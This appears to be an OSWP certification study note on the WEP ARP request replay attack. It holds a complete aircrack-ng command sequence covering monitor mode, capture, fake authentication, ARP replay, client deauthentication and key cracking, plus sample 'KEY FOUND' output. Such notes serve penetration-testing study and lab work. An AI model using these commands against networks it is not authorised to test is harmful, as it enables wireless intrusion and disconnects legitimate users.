# OSWP - ARP Request Replay Attack (Attacking the AP/Connected) (WEP)

The classic ARP request replay attack is the most effective way to generate new initialization vectors (IVs), and works very reliably. The program listens for an ARP packet then retransmits it back to the access point. This, in turn, causes the access point to repeat the ARP packet with a new IV. The program retransmits the same ARP packet over and over. However, each ARP packet repeated by the access point has a new IVs. It is all these new IVs which allow you to determine the WEP key.

ARP is address resolution protocol: A TCP/IP protocol used to convert an IP address into a physical address, such as an Ethernet address. A host wishing to obtain a physical address broadcasts an ARP request onto the TCP/IP network. The host on the network that has the address in the request then replies with its physical hardware address.

## Commands

* Run [setup](../../setup.md) first
* Up to three terminals are needed, so `screen` is your friend
* At least one client must be associated with the AP

```bash
# [Terminal One]
# Set interface to monitor mode
sudo airmon-ng start $ADAPTER $CHANNEL

# Start monitoring - make terminal large enough to see everything
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE

# [Terminal Two]
# Run the fake authentication attack first
sudo aireplay-ng --fakeauth 0 -a $BSSID -e $SSID -h $INTERFACEMAC $INTERFACE

# Run the ARP replay attack
sudo aireplay-ng --arpreplay -b $BSSID -h $INTERFACEMAC $INTERFACE

# Watch for the data to rapidly increase in the aireplay-ng window
# To speed things up, do the next step - deauthentication attack

# [Terminal Three]
# Run the deauthentication attack (to help facilitate ARP packets for IVs)
sudo aireplay-ng --deauth 7 -a $BSSID -c $CLIENT $INTERFACE

# Get lots and lots of IVs (several minutes > 150K data ... mileage may vary though)
# Stop everything

# Crack the WEP keister (ensure that plenty of IVs are captured beforehand)
sudo aircrack-ng -0 $PCAP
```
* Look for the suscessful output - assuming enough IVs are available

```
1 potential targets                                 Got 156299 out of 155000 IVsStarting PTW attack with 156299 ivs.
                     KEY FOUND! [ AA:BB:CC:DD:EE:FF ] (ASCII: 12345 )
Attack wDecrypted correctly: 100%00 captured ivs.
```

## References

* [Airmon-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng)
* [Aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)
* [ARP Request Replay](https://www.aircrack-ng.org/doku.php?id=arp-request_reinjection)
* [REdBlueTeam](https://youtu.be/_9qJ1Urpn0Y?t=2615)
